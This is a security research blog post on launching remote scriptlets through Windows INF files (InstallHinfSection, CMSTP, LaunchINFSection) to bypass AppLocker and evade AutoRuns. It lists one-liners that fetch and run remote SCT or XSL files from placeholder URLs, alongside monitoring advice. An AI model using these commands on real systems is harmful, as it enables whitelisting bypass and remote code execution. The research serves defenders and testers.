# Leveraging INF-SCT Fetch & Execute Techniques For Bypass Applocker, Evasion, & Persistence

### Introduction

Over the last few weeks, I researched and tested a few interesting namespaces/methods documented on various Microsoft/MSDN sources that dealt with executing various COM scripts/scriptlets (e.g. VBscript, Jscript, etc.).  In particular, I was curious to see if there were potentially new ways to invoke remote scripts (ActiveX Objects) by leveraging some of the great research already performed and documented by [@subTee](https://twitter.com/subTee), [@Oddvarmoe](https://twitter.com/Oddvarmoe), [@ItsReallyNick](https://twitter.com/ItsReallyNick), [@KyleHanslovan](https://twitter.com/KyleHanslovan), [@ChrisBisnett](https://twitter.com/chrisbisnett), and [@NickTyrer](https://twitter.com/NickTyrer).  There were some interesting findings, but the one that really stood out was the discovery of **LaunchINFSection**, a ‘new’ method to remotely launch staged SCT files configured within INF files.

In this post, we’ll discuss several known INF-SCT launch methods, introduce LaunchINFSection, and dive into use cases/defensive considerations.  Additionally, we’ll reference other techniques for remote script/scriptlet execution.

### INF-SCT Launch Methods

Methods for launching script component files (‘.sct’) via INF configuration files include InstallHinfSection (setupapi.dll), CMSTP, and LaunchINFSection (advpack.dll).  Let’s dive in…

**Malicious INF-SCT Usage with InstallHinfSection**

At [DerbyCon](https://twitter.com/DerbyCon) 2017, @KyleHanslovan and @ChrisBisnett of [@HuntressLabs](https://twitter.com/HuntressLabs) presented a very interesting topic – [Evading AutoRuns](https://github.com/huntresslabs/evading-autoruns/blob/master/Evading\_Autoruns\_Slides.pdf).  In their presentation, they showcase a method for launching remote SCT via INF by invoking  InstallHinfSection with the following command:

```
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 [path to file.inf]
```

Within the [source](https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf) INF file used for remote SCT execution, ‘rundll32.exe setupapi.dll,InstallHinfSection’ calls the default INF section (‘DefaultInstall’).  Under this section, the Unregister DLLs directive (UnregisterDlls) calls the ‘Squiblydoo’ section to perform the ‘malicious’ action of invoking scrobj.dll to fetch and run the SCT script file.

**Malicious INF-SCT Usage With CMSTP**

About a month ago, @NickTyrer demonstrated on [Twitter](https://twitter.com/NickTyrer/status/958450014111633408) that INF files could be used to fetch SCT files from web resources to execute COM scripts/scriptlets using **cmstp.exe**, a utility that had been documented by @Oddvarmoe to [bypass](https://msitpros.com/?p=3960) UAC and AppLocker default policies.  For reference, basic usage for cmstp.exe is as follows:

```
cmstp.exe /s [file].inf
```

Within the [source](https://twitter.com/NickTyrer/status/958450014111633408) INF file used for remote SCT execution, cmstp.exe calls the INF section named ‘DefaultInstall\_SingleUser’.  Under this section, the OCX unregister directive (UnRegisterOCX) calls the ‘UnRegisterOCXSection’ section to perform the ‘malicious’ action of invoking scrobj.dll to fetch and run the SCT script file.

**Malicious INF/SCT Usage With LaunchINFSection**

According to Microsoft [documentation](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/gg441316\(v=vs.85\)), LaunchINFSection is a method within the Advanced INF Package Installer (advpack.dll) that is used to invoke a particular section within a setup information (.inf) file.  In the administrative sense, INF files are typically used as an instruction file for the installation of device drivers and/or Windows Cabinet (.cab) files, which may include registering Windows binaries (exe, dll, ocx), adding keys to the registry, and/or specifying critical parameter settings.  The general method for LaunchINFSection invocation is as follows:

```
rundll32.exe advpack.dll,LaunchINFSection [file].inf,[INF Section],[Path to Cab].cab,[Installation Flags]
```

If the \[INF Section] is not specified, LaunchINFSection will attempt to call **DefaultInstall** for the default section.  Additionally, it is worth noting that the Advanced INF Package Installer also contains the function **LaunchINFSectionEx** as well as other character set comparability functions (e.g. LaunchINFSectionA), which effectively do the same thing as LaunchINFSection.

For proof of concept, we can simply [modify](https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf) the INF file used by @NickTyrer with a staged SCT script payload found [here](https://gist.githubusercontent.com/bohops/6ded40c4989c673f2e30b9a6c1985019/raw/33dc4cae00a10eb86c02b561b1c832df6de40ef6/test.sct) (big shout out to @subTee and [@redcanaryco](https://twitter.com/redcanaryco) for providing their AtomicRedTeam scripts and many useful test payloads to the community). Let’s download the modified INF to the ‘target’ (test.inf) and invoke LaunchINFSection (using a placeholder value of ‘1’ for our non-existant cab file) with the following command:

```
rundll32.exe advpack.dll,LaunchINFSection test.inf,DefaultInstall_SingleUser,1,
```

As shown in the following screenshot, our INF-SCT-Calc Scriptet payload was successfully launched:

![.gitbook/assets/1663788152.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788151/qylykwczyksqwrnfsh41.png)

Take note that we can also launch our payload in other, slightly different ways.  If we change the INF file entry point section to ‘DefaultInstall’, we can launch our payload without section specification using the following command:

```
rundll32.exe advpack.dll,LaunchINFSection test.inf,,1,
```

The same payload is successfully launched:

![.gitbook/assets/1663788153.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788152/eo1jjqgs7o3nmwqicnwi.png)

Additionally, we can change the OCX unregister directive to a register directive (‘RegisterOCXs’) and supply a random name (e.g. ‘MoreFun’) to invoke the same payload:

![.gitbook/assets/1663788154.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788154/ahgm1ihkcr7sn6fee2ie.png)

### Some Use Cases & Defensive Considerations

In addition to the environmental considerations above, defenders should keep an eye out for these:

**Malware**

In the wild, actors have leveraged malware INF payloads.  @ItsReallyNick discovered several [malware samples](https://twitter.com/ItsReallyNick/status/958789644165894146) that actually took advantage of @NickTyrer’s CMSTP technique a few years ago.  Other samples show malware from the early 2000s that appear to take advantage of more native administrative techniques using LaunchINFSection without INF-SCT execution.

![.gitbook/assets/1663788155.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788155/dzq6t3vfbqyytm1vheji.png)

![.gitbook/assets/1663788157.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788156/flcmp37w0oiqcynb6kkh.png)

**Bypass, Evasion, & Persistence**

In addition to [bypassing](https://msitpros.com/?p=3960) Operating System security controls such as Application Whitelisting and User Account Control, CMSTP can be used for AutoRuns evasion and persistence.  Here is a screenshot that does not show CMSTP when the ‘Hide Windows Entries’ flag is enabled within AutoRuns:

![.gitbook/assets/1663788158.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788157/hwqfkenzb9hgdnl544zl.png)

Here is a screenshot with CMSTP present without any filtering:

![.gitbook/assets/1663788159.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788159/y0up0dt6fuuxdrotlkmp.png)

\*Note: LaunchINFSection and InstallHinfSection do not appear to be evasive candidates for (newer) versions of AutoRuns because these methods rely on rundll32.exe to invoke the respective dll.  These methods are not filtered after hiding Windows and Microsoft entries.  However, LaunchINFSection proves to be a valid application whitelisting bypass technique as we were able to “gain code execution” against [default](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/) AppLocker rules.

**On the Network**

Hopefully, network analysis is still important these days.  Here is a sample GET request invoked by scrobj.dll to fetch a fake SCT file:

![.gitbook/assets/1663788160.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788160/i5ofsrf5rltjm8hpchdu.png)

Take note of the User-Agent.  Interestingly enough, I have seen this with other Microsoft utilities that have the ability to perform such requests.  These days, it may be worth treating anything that remote fetches with scrutiny (I know – easier said than done).

**Arbitrary File Names**

**Now for a kicker** – SCT files are merely text/XML files and INF files are text files.  In my basic testing, these files **do not need a proper extension for invocation**.  In this example, we call ‘test.notinf’ and ‘test.notsct’ to successfully execute our ‘sct’ payload:

![.gitbook/assets/1663788161.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788161/vjmfduw0ewas2c6dslxv.png)

**Other Considerations**

\*Host Monitoring is essential.  If budget is a constraint, consider using [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) (free) to feed your ([open-source](https://wazuh.com/)) SIEM.  Monitor for the introduction of new “.inf” files within the environment and execution of such files with the methods described above.

\*Application Whitelisting is still essential.  Default AppLocker rules are pretty much based on path constraints.  As I previously [blogged](https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/) about, some of these paths do allow users to write to sub-directories in sensitive hierarchical paths.  Ensure these paths are locked down.  This will at least help protect against a subset of execution techniques (and hopefully alert you when an event is triggered).

\*INF execution is not the only way to invoke ‘sct’ scripts.  I will blog about other methods in greater detail down the road (including some ‘new’ techniques), but here is a quick rundown of a few of them:

**RegSvr32/Scrobj.dll** \[[Reference](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md)]

```
regsvr32 /s /n /u /i:http://url/file.sct scrobj.dll
```

**PubPrn** \[[Reference](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)]

```
pubprn.vbs 127.0.0.1 script:http://url/file.sct
```

**Microsoft.JScript.Eval Assembly via PowerShell** \[[Reference](https://twitter.com/bohops/status/965085651199840258)]

```
[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http://url/file.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
```

**Microsoft.VisualBasic.Interaction Assembly via PowerShell** \[[Reference](https://twitter.com/bohops/status/965670898379476993)]

```
[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http://url/file.sct').Exec(0)
```

\*It is also worth noting that ‘sct’ is not the only player in the game.  Here are a few other ‘remote’ XML/XSLT techniques that need to be monitored:

**MsXSL** \[[Reference](https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker)]

```
msxsl.exe http://url/file.xml http://url/file.xsl
```

**System.Xml.Xsl.XslCompiledTransform Assembly via PowerShell** \[[Reference](https://twitter.com/bohops/status/966172175555284992)]

```
$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('http://url/file.xsl',$s,$r);$x.Transform('http://url/file.xml','z');del z;
```

### Conclusion

Thank you for taking the time to read this blog post.  I will add content as I learn more and/or capture greater insight from the community.  If you have questions/comments/or notice that I left out anything important, send me an email through the \[contact]
